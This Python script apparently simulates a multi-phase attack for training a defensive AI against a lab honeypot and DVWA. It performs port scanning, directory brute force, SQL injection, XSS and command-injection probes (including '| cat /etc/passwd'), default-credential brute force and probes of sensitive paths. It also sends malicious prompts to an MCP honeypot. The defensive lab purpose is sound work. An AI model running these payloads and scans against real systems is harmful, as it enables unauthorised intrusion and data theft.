#!/usr/bin/env python3
"""
AI-Defender Attack Simulation Suite
Simulates various attack patterns for testing defensive AI

Run from Kali VM against:
- Honeypot (10.0.0.1:5000)
- DVWA Target (10.0.0.20)

These are CONTROLLED simulations for training the defensive AI.
Only run in isolated lab environment!
"""

import requests
import subprocess
import json
import time
import random
import argparse
from datetime import datetime
from pathlib import Path

# Configuration
HONEYPOT_URL = "http://10.0.0.1:5000"
DVWA_URL = "http://10.0.0.20"
LOG_DIR = Path("/mnt/attack_scripts/logs")

class AttackSimulator:
    """Simulates AI-orchestrated attack patterns from the GTG-1002 report"""

    def __init__(self, target="honeypot", verbose=True):
        self.target = HONEYPOT_URL if target == "honeypot" else DVWA_URL
        self.verbose = verbose
        self.session = requests.Session()
        self.attack_log = []

        LOG_DIR.mkdir(exist_ok=True)

    def log(self, phase, action, result):
        """Log attack action for defensive AI training"""
        entry = {
            "timestamp": datetime.now().isoformat(),
            "phase": phase,
            "action": action,
            "target": self.target,
            "result": result
        }
        self.attack_log.append(entry)
        if self.verbose:
            print(f"[{phase}] {action}: {result[:100]}...")

    def save_logs(self):
        """Save attack logs for training data"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        log_file = LOG_DIR / f"attack_log_{timestamp}.json"
        with open(log_file, "w") as f:
            json.dump(self.attack_log, f, indent=2)
        print(f"\nLogs saved to: {log_file}")

    # ========== PHASE 1: RECONNAISSANCE ==========

    def phase1_port_scan(self):
        """Simulate Nmap-style port scanning"""
        common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445,
                       3306, 3389, 5432, 5900, 8080, 8443]

        results = []
        for port in common_ports:
            try:
                # Quick TCP connect check
                import socket
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                host = self.target.replace("http://", "").split(":")[0]
                result = sock.connect_ex((host, port))
                if result == 0:
                    results.append(f"Port {port}: OPEN")
                sock.close()
            except:
                pass

        self.log("Phase1-Recon", "port_scan", str(results))
        return results

    def phase1_service_enum(self):
        """Enumerate services on discovered ports"""
        try:
            # HTTP service detection
            resp = self.session.get(f"{self.target}/", timeout=5)
            server = resp.headers.get("Server", "Unknown")
            self.log("Phase1-Recon", "service_enum", f"HTTP Server: {server}")
            return {"http_server": server, "status": resp.status_code}
        except Exception as e:
            self.log("Phase1-Recon", "service_enum", f"Error: {str(e)}")
            return None

    def phase1_directory_brute(self):
        """Directory bruteforce simulation"""
        common_dirs = [
            "/admin", "/login", "/api", "/config", "/backup",
            "/uploads", "/wp-admin", "/phpmyadmin", "/.git",
            "/robots.txt", "/sitemap.xml", "/.env", "/config.php"
        ]

        found = []
        for path in common_dirs:
            try:
                resp = self.session.get(f"{self.target}{path}", timeout=2)
                if resp.status_code != 404:
                    found.append(f"{path} ({resp.status_code})")
            except:
                pass
            time.sleep(0.1)  # Rate limiting

        self.log("Phase1-Recon", "dir_brute", str(found))
        return found

    # ========== PHASE 2: VULNERABILITY DISCOVERY ==========

    def phase2_sql_injection_test(self):
        """Test for SQL injection vulnerabilities"""
        payloads = [
            "' OR '1'='1",
            "1' ORDER BY 1--",
            "1 UNION SELECT NULL--",
            "'; DROP TABLE users--",
            "1' AND SLEEP(5)--"
        ]

        results = []
        for payload in payloads:
            try:
                # Test in common parameters
                test_urls = [
                    f"{self.target}/search?q={payload}",
                    f"{self.target}/user?id={payload}",
                    f"{self.target}/product?id={payload}"
                ]
                for url in test_urls:
                    resp = self.session.get(url, timeout=5)
                    if "error" in resp.text.lower() or "sql" in resp.text.lower():
                        results.append(f"Potential SQLi: {url[:50]}")
            except:
                pass
            time.sleep(0.2)

        self.log("Phase2-VulnDisc", "sqli_test", str(results) if results else "No obvious SQLi found")
        return results

    def phase2_xss_test(self):
        """Test for XSS vulnerabilities"""
        payloads = [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>",
            "javascript:alert('xss')",
            "<svg onload=alert('xss')>"
        ]

        results = []
        for payload in payloads:
            try:
                resp = self.session.get(f"{self.target}/search?q={payload}", timeout=5)
                if payload in resp.text:
                    results.append(f"Reflected XSS possible")
                    break
            except:
                pass

        self.log("Phase2-VulnDisc", "xss_test", str(results) if results else "XSS not directly reflected")
        return results

    def phase2_command_injection_test(self):
        """Test for command injection"""
        payloads = [
            "; ls -la",
            "| cat /etc/passwd",
            "& whoami",
            "`id`"
        ]

        results = []
        for payload in payloads:
            try:
                resp = self.session.post(
                    f"{self.target}/ping",
                    data={"host": f"127.0.0.1{payload}"},
                    timeout=5
                )
                if "root" in resp.text or "uid=" in resp.text:
                    results.append("Command injection possible!")
            except:
                pass

        self.log("Phase2-VulnDisc", "cmdi_test", str(results) if results else "No obvious command injection")
        return results

    # ========== PHASE 3: CREDENTIAL HARVESTING ==========

    def phase3_login_brute(self):
        """Simulate credential bruteforce"""
        common_creds = [
            ("admin", "admin"),
            ("admin", "password"),
            ("root", "root"),
            ("test", "test"),
            ("admin", "123456")
        ]

        results = []
        for user, pwd in common_creds:
            try:
                resp = self.session.post(
                    f"{self.target}/login",
                    data={"username": user, "password": pwd},
                    timeout=5,
                    allow_redirects=False
                )
                if resp.status_code in [302, 200] and "dashboard" in resp.text.lower():
                    results.append(f"Valid creds: {user}:{pwd}")
            except:
                pass
            time.sleep(0.5)  # Avoid lockout

        self.log("Phase3-CredHarvest", "login_brute", str(results) if results else "No valid creds found")
        return results

    # ========== PHASE 4: DATA EXTRACTION ==========

    def phase4_data_exfil_attempt(self):
        """Simulate data exfiltration attempts"""
        sensitive_paths = [
            "/api/users",
            "/api/config",
            "/backup/db.sql",
            "/logs/access.log",
            "/.env"
        ]

        results = []
        for path in sensitive_paths:
            try:
                resp = self.session.get(f"{self.target}{path}", timeout=5)
                if resp.status_code == 200 and len(resp.text) > 100:
                    results.append(f"Data found at {path}: {len(resp.text)} bytes")
            except:
                pass

        self.log("Phase4-DataExfil", "data_harvest", str(results) if results else "No accessible data endpoints")
        return results

    # ========== HONEYPOT-SPECIFIC ==========

    def send_malicious_prompt_to_honeypot(self, prompt):
        """Send a malicious prompt to the honeypot MCP server"""
        try:
            resp = self.session.post(
                f"{self.target}/v1/mcp",
                json={"prompt": prompt},
                timeout=10
            )
            result = resp.json() if resp.headers.get("content-type") == "application/json" else resp.text
            self.log("Honeypot-Test", "malicious_prompt", str(result)[:200])
            return result
        except Exception as e:
            self.log("Honeypot-Test", "malicious_prompt", f"Error: {str(e)}")
            return None

    def run_full_simulation(self):
        """Run complete attack simulation matching GTG-1002 phases"""
        print(f"\n{'='*60}")
        print(f"AI-DEFENDER ATTACK SIMULATION")
        print(f"Target: {self.target}")
        print(f"Started: {datetime.now().isoformat()}")
        print(f"{'='*60}\n")

        # Phase 1: Reconnaissance
        print("\n[PHASE 1: RECONNAISSANCE]")
        self.phase1_port_scan()
        self.phase1_service_enum()
        self.phase1_directory_brute()

        # Phase 2: Vulnerability Discovery
        print("\n[PHASE 2: VULNERABILITY DISCOVERY]")
        self.phase2_sql_injection_test()
        self.phase2_xss_test()
        self.phase2_command_injection_test()

        # Phase 3: Credential Harvesting
        print("\n[PHASE 3: CREDENTIAL HARVESTING]")
        self.phase3_login_brute()

        # Phase 4: Data Extraction
        print("\n[PHASE 4: DATA EXTRACTION]")
        self.phase4_data_exfil_attempt()

        # Save logs
        self.save_logs()

        print(f"\n{'='*60}")
        print(f"SIMULATION COMPLETE")
        print(f"Total actions logged: {len(self.attack_log)}")
        print(f"{'='*60}\n")


def main():
    parser = argparse.ArgumentParser(description="AI-Defender Attack Simulator")
    parser.add_argument("--target", choices=["honeypot", "dvwa"], default="honeypot",
                       help="Target to attack (default: honeypot)")
    parser.add_argument("--phase", type=int, choices=[1, 2, 3, 4],
                       help="Run specific phase only")
    parser.add_argument("--prompt", type=str,
                       help="Send specific malicious prompt to honeypot")

    args = parser.parse_args()

    sim = AttackSimulator(target=args.target)

    if args.prompt:
        sim.send_malicious_prompt_to_honeypot(args.prompt)
    elif args.phase:
        phases = {
            1: [sim.phase1_port_scan, sim.phase1_service_enum, sim.phase1_directory_brute],
            2: [sim.phase2_sql_injection_test, sim.phase2_xss_test, sim.phase2_command_injection_test],
            3: [sim.phase3_login_brute],
            4: [sim.phase4_data_exfil_attempt]
        }
        for func in phases[args.phase]:
            func()
        sim.save_logs()
    else:
        sim.run_full_simulation()


if __name__ == "__main__":
    main()
